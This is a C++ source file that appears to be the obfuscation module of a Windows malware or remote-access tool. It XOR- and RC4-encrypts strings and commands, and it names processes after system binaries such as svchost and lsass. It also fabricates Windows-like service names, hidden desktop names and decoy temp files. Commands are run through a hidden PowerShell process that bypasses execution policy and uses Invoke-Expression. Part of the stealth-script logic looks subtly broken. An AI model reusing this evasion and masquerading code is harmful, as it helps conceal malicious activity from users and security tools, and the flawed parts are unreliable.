#include "obfuscation.h"
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <random>
#include <algorithm>

namespace Utils {
    std::string EncodeHex(const std::vector<uint8_t>& data) {
        std::stringstream ss;
        ss << std::hex << std::setfill('0');
        for (uint8_t byte : data) {
            ss << std::setw(2) << static_cast<int>(byte);
        }
        return ss.str();
    }
    
    std::vector<uint8_t> DecodeHexData(const std::string& hex) {
        std::vector<uint8_t> result;
        for (size_t i = 0; i < hex.length(); i += 2) {
            std::string byte_str = hex.substr(i, 2);
            uint8_t byte = static_cast<uint8_t>(std::stoi(byte_str, nullptr, 16));
            result.push_back(byte);
        }
        return result;
    }
    
    std::string EncodeBase64(const std::vector<uint8_t>& data) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string result;
        int val = 0, valb = -6;
        
        for (uint8_t c : data) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        
        if (valb > -6) {
            result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        }
        
        while (result.size() % 4) {
            result.push_back('=');
        }
        
        return result;
    }
    
    std::vector<uint8_t> DecodeBase64(const std::string& base64) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::vector<uint8_t> result;
        int val = 0, valb = -8;
        
        for (char c : base64) {
            if (c == '=') break;
            size_t pos = chars.find(c);
            if (pos == std::string::npos) continue;
            
            val = (val << 6) + static_cast<int>(pos);
            valb += 6;
            if (valb >= 0) {
                result.push_back(static_cast<uint8_t>((val >> valb) & 0xFF));
                valb -= 8;
            }
        }
        
        return result;
    }
    
    uint64_t GetCurrentTimestamp() {
        auto now = std::chrono::high_resolution_clock::now();
        auto duration = now.time_since_epoch();
        return std::chrono::duration_cast<std::chrono::microseconds>(duration).count();
    }
    
    std::string GenerateRandomString(size_t length) {
        const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, chars.size() - 1);
        
        std::string result;
        result.reserve(length);
        for (size_t i = 0; i < length; ++i) {
            result += chars[dis(gen)];
        }
        return result;
    }
    
    uint32_t GetRandomSeed() {
        std::random_device rd;
        return rd();
    }
}

// StringObfuscator implementation
StringObfuscator::StringObfuscator() : rng(Utils::GetRandomSeed()) {
    key = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};
}

StringObfuscator::StringObfuscator(const std::vector<uint8_t>& custom_key) 
    : rng(Utils::GetRandomSeed()), key(custom_key) {}

std::string StringObfuscator::ObfuscateXOR(const std::string& input) {
    std::vector<uint8_t> result;
    for (size_t i = 0; i < input.length(); ++i) {
        uint8_t obfuscated = static_cast<uint8_t>(input[i]) ^ key[i % key.size()];
        result.push_back(obfuscated);
    }
    return Utils::EncodeHex(result);
}

std::string StringObfuscator::DeobfuscateXOR(const std::string& obfuscated) {
    std::vector<uint8_t> data = Utils::DecodeHexData(obfuscated);
    std::string result;
    for (size_t i = 0; i < data.size(); ++i) {
        char deobfuscated = static_cast<char>(data[i] ^ key[i % key.size()]);
        result += deobfuscated;
    }
    return result;
}

std::string StringObfuscator::ObfuscateRC4(const std::string& input) {
    std::vector<uint8_t> S(256);
    for (int i = 0; i < 256; ++i) {
        S[i] = i;
    }
    
    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + S[i] + key[i % key.size()]) % 256;
        std::swap(S[i], S[j]);
    }
    
    std::vector<uint8_t> result;
    int i = 0, k = 0;
    for (char c : input) {
        i = (i + 1) % 256;
        k = (k + S[i]) % 256;
        std::swap(S[i], S[k]);
        uint8_t keystream = S[(S[i] + S[k]) % 256];
        result.push_back(static_cast<uint8_t>(c) ^ keystream);
    }
    
    return Utils::EncodeBase64(result);
}

std::string StringObfuscator::DeobfuscateRC4(const std::string& obfuscated) {
    std::vector<uint8_t> data = Utils::DecodeBase64(obfuscated);
    
    std::vector<uint8_t> S(256);
    for (int i = 0; i < 256; ++i) {
        S[i] = i;
    }
    
    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + S[i] + key[i % key.size()]) % 256;
        std::swap(S[i], S[j]);
    }
    
    std::string result;
    int i = 0, k = 0;
    for (uint8_t byte : data) {
        i = (i + 1) % 256;
        k = (k + S[i]) % 256;
        std::swap(S[i], S[k]);
        uint8_t keystream = S[(S[i] + S[k]) % 256];
        result += static_cast<char>(byte ^ keystream);
    }
    
    return result;
}

std::vector<std::string> StringObfuscator::SplitString(const std::string& input, size_t max_chunk_size) {
    std::vector<std::string> chunks;
    for (size_t i = 0; i < input.length(); i += max_chunk_size) {
        chunks.push_back(input.substr(i, max_chunk_size));
    }
    return chunks;
}

std::string StringObfuscator::JoinString(const std::vector<std::string>& chunks) {
    std::string result;
    for (const auto& chunk : chunks) {
        result += chunk;
    }
    return result;
}

std::string StringObfuscator::ObfuscateMultiLevel(const std::string& input) {
    std::string result = input;
    result = ObfuscateXOR(result);
    result = ObfuscateRC4(result);
    return result;
}

std::string StringObfuscator::DeobfuscateMultiLevel(const std::string& obfuscated) {
    std::string result = obfuscated;
    result = DeobfuscateRC4(result);
    result = DeobfuscateXOR(result);
    return result;
}

void StringObfuscator::RotateKey() {
    std::uniform_int_distribution<uint8_t> dis(0, 255);
    for (auto& byte : key) {
        byte = dis(rng);
    }
}

void StringObfuscator::SetKey(const std::vector<uint8_t>& new_key) {
    key = new_key;
}

// NameObfuscator implementation
NameObfuscator::NameObfuscator() : rng(Utils::GetRandomSeed()) {
    InitializeNamePool();
}

void NameObfuscator::InitializeNamePool() {
    name_pool = {
        "svchost", "explorer", "winlogon", "csrss", "lsass", "services",
        "chrome", "firefox", "notepad", "calc", "mspaint", "wordpad",
        "taskmgr", "regedit", "cmd", "powershell", "system", "dwm",
        "audiodg", "conhost", "spoolsv", "wininit", "smss", "winload"
    };
}

std::string NameObfuscator::GenerateProcessName() {
    std::uniform_int_distribution<size_t> dis(0, name_pool.size() - 1);
    std::string base_name = name_pool[dis(rng)];
    
    std::uniform_int_distribution<int> variant_dis(1, 3);
    int variant = variant_dis(rng);
    
    switch (variant) {
        case 1: return base_name + ".exe";
        case 2: return base_name + std::to_string(dis(rng) % 100) + ".exe";
        case 3: return base_name + "_" + Utils::GenerateRandomString(3) + ".exe";
        default: return base_name + ".exe";
    }
}

std::string NameObfuscator::GenerateDesktopName() {
    const std::vector<std::string> desktop_prefixes = {
        "Default", "Winsta0", "Service", "System", "Interactive"
    };
    
    std::uniform_int_distribution<size_t> dis(0, desktop_prefixes.size() - 1);
    std::string prefix = desktop_prefixes[dis(rng)];
    
    return prefix + "_" + Utils::GenerateRandomString(8);
}

std::string NameObfuscator::GenerateServiceName() {
    const std::vector<std::string> service_prefixes = {
        "Windows", "Microsoft", "System", "Service", "Update"
    };
    
    std::uniform_int_distribution<size_t> dis(0, service_prefixes.size() - 1);
    std::string prefix = service_prefixes[dis(rng)];
    
    return prefix + Utils::GenerateRandomString(6) + "Svc";
}

std::string NameObfuscator::GenerateFileName() {
    const std::vector<std::string> file_prefixes = {
        "temp", "tmp", "cache", "log", "data", "config", "system"
    };
    
    std::uniform_int_distribution<size_t> dis(0, file_prefixes.size() - 1);
    std::string prefix = file_prefixes[dis(rng)];
    
    return prefix + "_" + Utils::GenerateRandomString(8);
}

void NameObfuscator::MarkNameAsUsed(const std::string& name) {
    used_names.push_back(name);
}

void NameObfuscator::ClearUsedNames() {
    used_names.clear();
}

void NameObfuscator::RefreshNamePool() {
    InitializeNamePool();
    ClearUsedNames();
}

std::string NameObfuscator::ObfuscateName(const std::string& original) {
    StringObfuscator str_obf;
    return str_obf.ObfuscateXOR(original);
}

bool NameObfuscator::IsNameSafe(const std::string& name) {
    return std::find(used_names.begin(), used_names.end(), name) == used_names.end();
}

// FileObfuscator implementation
FileObfuscator::FileObfuscator() : temp_directory(std::filesystem::temp_directory_path().string()) {}

FileObfuscator::FileObfuscator(const std::string& temp_dir) : temp_directory(temp_dir) {}

std::string FileObfuscator::CreateObfuscatedFile(const std::vector<uint8_t>& data, const std::string& extension) {
    NameObfuscator name_obf;
    std::string filename = name_obf.GenerateFileName() + extension;
    std::string full_path = temp_directory + "/" + filename;
    
    std::vector<uint8_t> obfuscated_data = data;
    std::string obfuscated_str = string_obfuscator.ObfuscateMultiLevel(
        std::string(obfuscated_data.begin(), obfuscated_data.end())
    );
    
    std::ofstream file(full_path, std::ios::binary);
    if (file.is_open()) {
        file.write(obfuscated_str.c_str(), obfuscated_str.size());
        file.close();
        created_files.push_back(full_path);
        return full_path;
    }
    
    return "";
}

bool FileObfuscator::ReadObfuscatedFile(const std::string& file_path, std::vector<uint8_t>& data) {
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) {
        return false;
    }
    
    std::string obfuscated_content((std::istreambuf_iterator<char>(file)),
                                   std::istreambuf_iterator<char>());
    file.close();
    
    std::string deobfuscated = string_obfuscator.DeobfuscateMultiLevel(obfuscated_content);
    data.assign(deobfuscated.begin(), deobfuscated.end());
    
    return true;
}

void FileObfuscator::CleanupFiles() {
    for (const auto& file_path : created_files) {
        std::filesystem::remove(file_path);
    }
    created_files.clear();
}

void FileObfuscator::SetTempDirectory(const std::string& temp_dir) {
    temp_directory = temp_dir;
}

std::string FileObfuscator::ObfuscateFilePath(const std::string& original_path) {
    std::filesystem::path path(original_path);
    NameObfuscator name_obf;
    
    std::string obfuscated_filename = name_obf.GenerateFileName() + path.extension().string();
    return path.parent_path().string() + "/" + obfuscated_filename;
}

bool FileObfuscator::CreateDecoyFiles(size_t count) {
    for (size_t i = 0; i < count; ++i) {
        std::vector<uint8_t> dummy_data(1024);
        std::uniform_int_distribution<uint8_t> dis(0, 255);
        
        std::random_device rd;
        std::mt19937 gen(rd());
        for (auto& byte : dummy_data) {
            byte = dis(gen);
        }
        
        CreateObfuscatedFile(dummy_data, ".tmp");
    }
    return true;
}

// CommandObfuscator implementation
CommandObfuscator::CommandObfuscator() {}

std::string CommandObfuscator::ObfuscateCommand(const std::string& command) {
    return string_obfuscator.ObfuscateMultiLevel(command);
}

std::string CommandObfuscator::DeobfuscateCommand(const std::string& obfuscated_command) {
    return string_obfuscator.DeobfuscateMultiLevel(obfuscated_command);
}

std::string CommandObfuscator::ObfuscateArguments(const std::vector<std::string>& args) {
    std::string combined;
    for (const auto& arg : args) {
        combined += arg + "\n";
    }
    return string_obfuscator.ObfuscateMultiLevel(combined);
}

std::vector<std::string> CommandObfuscator::DeobfuscateArguments(const std::string& obfuscated_args) {
    std::string deobfuscated = string_obfuscator.DeobfuscateMultiLevel(obfuscated_args);
    std::vector<std::string> args;
    std::stringstream ss(deobfuscated);
    std::string line;
    
    while (std::getline(ss, line)) {
        if (!line.empty()) {
            args.push_back(line);
        }
    }
    
    return args;
}

std::string CommandObfuscator::CreateStealthScript(const std::string& original_script) {
    std::string obfuscated = string_obfuscator.ObfuscateMultiLevel(original_script);
    
    std::string wrapper = R"(
$encoded = ')" + obfuscated + R"('
$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded
)";
    
    return wrapper;
}

bool CommandObfuscator::ExecuteObfuscatedCommand(const std::string& command, const std::vector<std::string>& args) {
    std::string full_command = command;
    for (const auto& arg : args) {
        full_command += " " + arg;
    }
    
    std::string obfuscated_script = CreateStealthScript(full_command);
    
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    std::string cmd_line = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + obfuscated_script + "\"";
    
    BOOL result = CreateProcessA(
        nullptr,
        const_cast<char*>(cmd_line.c_str()),
        nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi
    );
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    
    return false;
}

// ObfuscationManager implementation
ObfuscationManager::ObfuscationManager() : enabled(true), obfuscation_level(3) {}

void ObfuscationManager::SetObfuscationLevel(uint32_t level) {
    obfuscation_level = std::min(level, 5u);
}

void ObfuscationManager::Enable(bool enable) {
    enabled = enable;
}

void ObfuscationManager::Disable() {
    enabled = false;
}

bool ObfuscationManager::IsEnabled() const {
    return enabled;
}

std::string ObfuscationManager::ObfuscateString(const std::string& input) {
    if (!enabled) return input;
    
    switch (obfuscation_level) {
        case 1: return string_obf.ObfuscateXOR(input);
        case 2: return string_obf.ObfuscateRC4(input);
        case 3:
        case 4:
        case 5: return string_obf.ObfuscateMultiLevel(input);
        default: return input;
    }
}

std::string ObfuscationManager::DeobfuscateString(const std::string& obfuscated) {
    if (!enabled) return obfuscated;
    
    switch (obfuscation_level) {
        case 1: return string_obf.DeobfuscateXOR(obfuscated);
        case 2: return string_obf.DeobfuscateRC4(obfuscated);
        case 3:
        case 4:
        case 5: return string_obf.DeobfuscateMultiLevel(obfuscated);
        default: return obfuscated;
    }
}

std::string ObfuscationManager::GenerateObfuscatedName(const std::string& type) {
    if (!enabled) return Utils::GenerateRandomString(8);
    
    if (type == "process") return name_obf.GenerateProcessName();
    if (type == "desktop") return name_obf.GenerateDesktopName();
    if (type == "service") return name_obf.GenerateServiceName();
    if (type == "file") return name_obf.GenerateFileName();
    
    return name_obf.GenerateFileName();
}

std::string ObfuscationManager::ObfuscateName(const std::string& original) {
    if (!enabled) return original;
    return name_obf.ObfuscateName(original);
}

std::string ObfuscationManager::CreateObfuscatedTempFile(const std::vector<uint8_t>& data) {
    if (!enabled) {
        std::string temp_path = std::filesystem::temp_directory_path().string() + "/temp_" + Utils::GenerateRandomString(8);
        std::ofstream file(temp_path, std::ios::binary);
        file.write(reinterpret_cast<const char*>(data.data()), data.size());
        return temp_path;
    }
    
    return file_obf.CreateObfuscatedFile(data);
}

bool ObfuscationManager::ReadObfuscatedTempFile(const std::string& file_path, std::vector<uint8_t>& data) {
    if (!enabled) {
        std::ifstream file(file_path, std::ios::binary);
        if (!file.is_open()) return false;
        
        data.assign((std::istreambuf_iterator<char>(file)),
                   std::istreambuf_iterator<char>());
        return true;
    }
    
    return file_obf.ReadObfuscatedFile(file_path, data);
}

std::string ObfuscationManager::PrepareObfuscatedCommand(const std::string& command, const std::vector<std::string>& args) {
    if (!enabled) return command;
    
    std::string obfuscated_cmd = cmd_obf.ObfuscateCommand(command);
    std::string obfuscated_args = cmd_obf.ObfuscateArguments(args);
    
    return obfuscated_cmd + "|" + obfuscated_args;
}

bool ObfuscationManager::ExecuteObfuscatedCommand(const std::string& command, const std::vector<std::string>& args) {
    if (!enabled) {
        std::string full_cmd = command;
        for (const auto& arg : args) {
            full_cmd += " " + arg;
        }
        return system(full_cmd.c_str()) == 0;
    }
    
    return cmd_obf.ExecuteObfuscatedCommand(command, args);
}

void ObfuscationManager::Cleanup() {
    file_obf.CleanupFiles();
    name_obf.ClearUsedNames();
}

void ObfuscationManager::RotateKeys() {
    string_obf.RotateKey();
    name_obf.RefreshNamePool();
}

// Global instance
ObfuscationManager g_obfuscation_manager;